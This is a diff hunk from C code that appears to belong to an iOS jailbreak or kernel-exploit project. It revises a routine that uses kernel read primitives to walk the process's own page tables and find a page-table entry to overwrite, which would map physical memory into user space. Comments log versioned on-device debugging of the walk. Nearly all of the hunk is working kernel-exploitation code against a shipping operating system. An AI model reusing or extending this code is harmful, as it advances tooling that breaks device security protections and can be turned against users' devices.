@@ -220,37 +220,38 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		return -1;
 	}
 
-	// Walk our own user page tables: 16KB granule, 4 levels.
-	// v82: ttep_self() returns the root TABLE PHYS (v81's invalid-kaddr
-	// 0x1012a98c000 = the root PA fed straight to kread64 → refused →
-	// l0e=0 → 0,0,0 cascade). Convert via phystokv (root PAs live in the
-	// papt-covered DRAM spans). Fallback keeps the raw value if conversion
-	// returns 0, and both are beaconed.
+	// Walk our own user page tables — v83: 3-LEVEL user walk. v82 data:
+	// root converts (tt,phys/va ✓), root entry ✓ (l1=fffffff20b120000),
+	// but the next read used index (va>>36)=0 while the on-device error
+	// address 0x428 = 8*(va>>25) proves the next index must be va>>25 —
+	// the user walk STARTS at L1 (v81/v82's "l0e" read WAS the L1 entry).
+	// Discriminator: l2alt reads the wrong-index slot for one launch.
+	// OA mask for 16KB granule PTEs: bits [47:14].
 	uint64_t va    = (uint64_t)base0;
 	uint64_t ttP   = ttep_self();
 	uint64_t tt    = phystokv(ttP & 0x0000FFFFFFFFC000ULL);
 	if (!tt) tt = ttP;
-	jb_tr_beacon("KMAP tt,phys=%llx,va=%llx", (unsigned long long)ttP,
-	             (unsigned long long)tt);
-	uint64_t l0e  = kread64(tt + 8 * ((va >> 47) & 0x1));
-	uint64_t l1   = phystokv(l0e & 0x0000FFFFFFFFC000ULL);
-	uint64_t l1e  = kread64(l1 + 8 * ((va >> 36) & 0x7FF));
-	uint64_t l2   = phystokv(l1e & 0x0000FFFFFFFFC000ULL);
-	uint64_t l2e  = kread64(l2 + 8 * ((va >> 25) & 0x7FF));
-	uint64_t l3   = phystokv(l2e & 0x0000FFFFFFFFC000ULL);
-	uint64_t pteA = l3 + 8 * ((va >> 14) & 0x7FF);
-	if (!l1 || !l2 || !l3) {
-		jb_tr_beacon("KMAP fail,ptewalk,l1=%llx,l2=%llx,l3=%llx",
-		             (unsigned long long)l1, (unsigned long long)l2,
-		             (unsigned long long)l3);
+	uint64_t l1e   = kread64(tt + 8 * ((va >> 36) & 0x7FF));
+	uint64_t l2    = phystokv(l1e & 0x0000FFFFFFFFC000ULL);
+	uint64_t l2e   = l2 ? kread64(l2 + 8 * ((va >> 25) & 0x7FF)) : 0;
+	uint64_t l2alt = l2 ? kread64(l2 + 8 * ((va >> 36) & 0x7FF)) : 0; // discriminator
+	uint64_t l3    = phystokv(l2e & 0x0000FFFFFFFFC000ULL);
+	uint64_t pteA  = l3 ? (l3 + 8 * ((va >> 14) & 0x7FF)) : 0;
+	jb_tr_beacon("KMAP w,tt=%llx,l1e=%llx,l2=%llx,l2e=%llx,l2alt=%llx,l3=%llx",
+	             (unsigned long long)tt, (unsigned long long)l1e,
+	             (unsigned long long)l2, (unsigned long long)l2e,
+	             (unsigned long long)l2alt, (unsigned long long)l3);
+	if (!l2 || !l3 || !pteA) {
+		jb_tr_beacon("KMAP fail,ptewalk");
 		*uaddr = NULL;
 		return -1;
 	}
 	// Sanity: the walk must reproduce what vtophys says about base0 —
 	// otherwise we are looking at the wrong table and MUST NOT write.
+	// vtophys takes the RAW phys root (historical call shape).
 	uint64_t origPte = kread64(pteA);
 	uint64_t walked  = origPte & 0x0000FFFFFFFFC000ULL;
-	uint64_t expect  = vtophys(tt, va) & ~0x3FFFULL;
+	uint64_t expect  = vtophys(ttP, va) & ~0x3FFFULL;
 	if (walked != expect) {
 		jb_tr_beacon("KMAP fail,pteverify,walked=%llx,expect=%llx",
 		             (unsigned long long)walked, (unsigned long long)expect);
